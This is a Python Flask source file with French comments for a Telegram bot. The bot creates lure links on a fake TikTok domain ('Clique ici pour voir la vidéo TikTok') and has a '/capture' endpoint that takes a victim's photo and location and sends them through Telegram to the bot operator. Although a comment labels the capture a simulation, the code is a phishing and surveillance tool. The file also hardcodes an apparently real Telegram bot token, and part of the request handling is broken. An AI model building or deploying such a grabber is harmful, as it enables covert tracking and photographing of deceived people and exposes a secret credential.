import os
import random
import string
import requests
from flask import Flask, request

# 🎯 Remplace ce token par ton vrai token Telegram
TELEGRAM_TOKEN = "7816514362:AAGKbLm3ARRwZz9BH0ByVJh9sSvjzAFSiiw"  # Ton token Telegram ici

# 📌 Initialiser Flask
app = Flask(__name__)

# 📌 Fonction pour générer un lien unique
def generate_unique_link():
    unique_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return f"https://fake-tiktok.com/{unique_id}"

# 📌 Page d’accueil
@app.route('/')
def home():
    return '🚀 Bot Telegram en ligne !'

# 📌 Générer un lien unique
@app.route('/generate-link')
def generate_link():
    link = generate_unique_link()
    return f"<a href='{link}'>Clique ici pour voir la vidéo TikTok</a>"

# 📌 Lorsque l'utilisateur envoie un message (commande /start)
@app.route('/start', methods=['GET', 'POST'])
def start():
    # Récupérer les données du message
    data = request.get_json()

    # Extraire le chat_id de la personne qui a démarré la conversation
    chat_id = data['message']['chat']['id']

    # Envoyer un message à l'utilisateur
    message = "Bienvenue! Voici ton lien unique:"
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={
        'chat_id': chat_id,
        'text': message
    })

    # Répondre au bot avec un message de bienvenue
    return 'Start command received.'

# 📌 Capturer photo et localisation (Simulation)
@app.route('/capture', methods=['POST'])
def capture():
    # Récupérer le fichier photo et la localisation envoyés
    photo = request.files.get('photo')
    location = request.form.get('location')

    # Récupérer les données du message pour envoyer à la bonne personne
    data = request.get_json()
    chat_id = data['message']['chat']['id']

    # ✅ Envoyer la photo et la localisation à la personne qui a démarré la conversation
    if photo:
        files = {'photo': photo.read()}
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data={'chat_id': chat_id}, files=files)

    if location:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={'chat_id': chat_id, 'text': f"📍 Localisation : {location}"})

    return '📸 Données envoyées à l\'utilisateur !'

# 📌 Lancer l’application Flask
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)